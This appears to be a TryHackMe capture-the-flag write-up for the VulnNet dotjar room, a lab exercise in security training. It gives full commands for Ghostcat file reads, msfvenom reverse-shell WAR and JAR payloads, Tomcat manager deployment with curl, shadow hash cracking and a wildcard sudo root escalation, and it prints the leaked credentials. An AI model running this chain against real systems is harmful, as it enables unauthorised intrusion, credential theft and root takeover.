---
layout: post
title: TryHackMe - VulnNet dotjar Write-Up
date: 2026-09-18
classes: wide
description: Turning an exposed AJP connector into a credential leak, then using Tomcat's text interface to deploy a WAR and land a shell.
---

# TryHackMe - VulnNet dotjar Write-Up

VulnNet Entertainment is back, and this time the whole machine is **Java**. It's a **medium** room, and the interesting part isn't a hand-written web bug: it's the servlet container itself, and how much it trusts whoever is talking to it.

The machine came up at `10.144.168.18`, so I've added it to `/etc/hosts` as `vulnnet.thm` — from here on the commands use the hostname, which is what I actually typed.

## Initial Scanning

As usual, the first step is to see what is exposed. **Rustscan** for the port sweep, then **nmap** for the fingerprints:

```sh
rustscan -a 10.144.168.18 --scripts none
nmap -sV -sC -p22,8009,8080 -Pn -oN scans/nmap.txt 10.144.168.18
```

And the scan:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
8080/tcp open  http    Apache Tomcat 9.0.30

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three ports, and one of them is a protocol that was never meant to be public.

## The Connector on 8009

**8080** is **Apache Tomcat 9.0.30**, showing the default landing page. **8009** is the **AJP13** connector — the binary protocol Tomcat uses to receive requests from a front-end web server, not from clients. Here there is no front-end at all: no **80**, no **443**. The connector is simply exposed to the network.

The version is what makes that interesting. **9.0.30 is one release before 9.0.31**, and 9.0.31 is where the fix for **CVE-2020-1938** — Ghostcat — landed. Ghostcat does two things: it reads files inside a deployed web application, and it can make the container process one of those files as a JSP. The first half is all I needed.

## Reading the App's Own Paperwork

For that read I went with the **Metasploit** module — it keeps the whole thing to a single command line and drops the loot in `~/.msf4/loot/`:

```sh
msfconsole -q -x "use auxiliary/admin/http/tomcat_ghostcat;set rhosts vulnnet.thm;set filename /WEB-INF/web.xml;run"
```

Only two options needed setting — `RPORT` already defaults to **8009** and `FILENAME` already points at `/WEB-INF/web.xml`.

`/WEB-INF/web.xml` is the application's own descriptor, and the deployer had used its `description` field as a notice board:

![The web.xml description block leaking developer credentials](/assets/img/post/thm_vulnnetdotjar/2.png)

Three sentences worth more than the XML around them:

- the account: `webdev:Hgj3LA$02D$Fa@21`
- **"GUI access is disabled for security reasons"**
- and the general vibe of a company that writes its passwords into application metadata

## Deploying the WAR Without the GUI

That line in the descriptor — **"GUI access is disabled for security reasons"** — is the answer to the next step. In Tomcat the GUI is just one interface among four: the account has no access to the HTML manager, so I didn't need it. The **text interface** does the same job, is meant for tooling, and speaks plain HTTP — `curl` is enough.

Its `deploy` endpoint accepts a WAR upload directly by `PUT`, so the whole step comes down to three commands: build the payload, get a handler listening, and push the file.

```sh
msfvenom -p java/jsp_shell_reverse_tcp lhost=tun0 lport=4444 -f war -o shell.war

msfconsole -q -x "use multi/handler;set payload java/jsp_shell_reverse_tcp;set lhost tun0;run -jz"

curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war "http://vulnnet.thm:8080/manager/text/deploy?path=/shell"
```

This is the step that is easy to misread as an **upload vulnerability**. It isn't one. The manager's job is to install applications, and an installed application *is* code that the container will run. Deploying a WAR is remote code execution performed by design — the permission is the security control, and the control walked out of the door with the credentials.

The WAR contains a JSP, so as soon as the context is up, requesting the app executes it with the privileges of the **Tomcat user**:

```sh
curl http://vulnnet.thm:8080/shell/
```

And that is a shell as `web`. From there I handed it to **Penelope**, which turns the raw connection into a proper interactive session:

```sh
penelope 4444
```

## What `web` Can Read

First thing after landing: **linpeas**, plus the usual manual pass. One line in `/var/backups` stood out immediately:

![The world-readable shadow backup in /var/backups](/assets/img/post/thm_vulnnetdotjar/3.png)

```
web@ip-10-144-168-18:/$ ll /var/backups/shadow-backup-alt.gz
-rw-r--r-- 1 root root 485 Jan 16  2021 /var/backups/shadow-backup-alt.gz

web@ip-10-144-168-18:/$ gunzip -l /var/backups/shadow-backup-alt.gz
         compressed        uncompressed  ratio uncompressed_name
                485                1179  61.0% /var/backups/shadow-backup-alt
```

A **backup of `/etc/shadow`**, sitting in a directory any user can read, with permissions that let any user read it. The `root` line and the `jdk-admin` line are both in there. I pulled that file down along with `/etc/passwd` — you need both, because `unshadow` combines them into the single-line format the cracking tools expect.

## Unshadow and Hashcat

```sh
unshadow passwd shadow > raw.txt
hashcat --identify raw.txt
hashcat -m 1800 -O raw.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt --outfile-format=1,2 --outfile=cracked.txt
```

> 💡 **Quick Tip:** `--outfile-format=1,2` saves each cracked line as `hash:password` instead of just the password, which makes it trivial to `grep` a specific account out of the results later. On hashcat 7 the format list is positional, so you compose it.

And the output:

```
$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:794613852
```

`jdk-admin:794613852` — a local account with a password that `rockyou.txt` had already seen. `su` and I was that user.

## The Root Step

`jdk-admin` is not a normal user on this box, and `sudo -l` explains why:

```
Matching Defaults entries for jdk-admin on ip-10-144-168-18:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User jdk-admin may run the following commands on ip-10-144-168-18:
    (root) /usr/bin/java -jar *.jar
```

**Root can run Java. Specifically: root can run any `*.jar`.** That's a wildcard, which means it isn't really one permission — it's permission to execute any JAR I can write. `jdk-admin` is a developer account, so writing a JAR in its own home is trivial:

```sh
msfvenom -p java/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f jar -o shell.jar
cat shell.jar | base64 -w0
```

The JAR goes up as a **base64 blob** pasted straight into the shell and decoded there — no upload channel needed, and the binary never has to survive a terminal:

```sh
echo 'BASE64_BLOB' | base64 -d > shell.jar
```

Then the interesting part: I let `sudo` run it.

```sh
sudo /usr/bin/java -jar shell.jar
```

**Metasploit** catches the session, and this time it's a **Meterpreter** one, so the payload gives a proper stage instead of a bare reverse TCP:

![Meterpreter session as root and the root flag](/assets/img/post/thm_vulnnetdotjar/4.png)

```
meterpreter > shell
python3 -c "import pty;pty.spawn('/bin/bash')"
root@ip-10-144-168-18:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Root. Both flags came at the end of the chain: `user.txt` was in `jdk-admin`'s home directory and `root.txt` in `/root` — `THM{1ae87fa6...}` and `THM{464c29e3...}`.

## Lessons Learned

This machine is a story about **metadata and defaults**. The credentials were published, by the deployer, in the application's own descriptor — right next to the line that told me which interface they were for. The connector on **8009** shipped exposed, and the file read it allowed was enough to walk away with those credentials. A **backup of `/etc/shadow`** sat in a world-readable directory and handed over a local password, and that account had root with a wildcard pointing at a file type *I* can produce.

The reusable version: read the service fingerprint as a version window, read configuration files as human documents, and take a hint about an interface as a hint about the **next** interface to use. A wildcard in a `sudo` rule is a permission you can write into.

Hack on!
